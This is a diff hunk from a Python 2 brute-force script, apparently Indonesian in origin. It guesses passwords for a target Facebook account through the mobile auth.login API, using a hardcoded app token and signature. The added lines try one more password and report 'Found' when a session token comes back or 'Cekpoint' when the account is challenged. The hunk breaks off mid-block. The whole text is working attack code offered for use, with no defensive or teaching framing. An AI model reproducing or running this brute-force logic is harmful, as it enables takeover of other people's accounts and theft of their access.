@@ -144,9 +144,17 @@ def brutefor():
                                                                                         elif "www.facebook.com" in js["error_msg"]:
                                                                                                 print "  Cekpoint : " + san10
                                                                                         else:
-                                                                                                print 
-                                                                                                print "  Gagalll..."
-                                                                                                print " ==============================="
+                                                                                                
+                                                                                                san11 = "anjing"
+                                                                                                print " [+] " + san11
+                                                                                                dev = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + target + '&locale=en_US&password=' + san11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                js = json.load(dev)
+                                                                                                if "access_token" in js:
+                                                                                                        print "  Found : " + san11
+                                                                                                elif "www.facebook.com" in js["error_msg"]:
+                                                                                                        print "  Cekpoint : " + san11
+                                                                                                else:
+                                                                                              
 
                                                                         
 
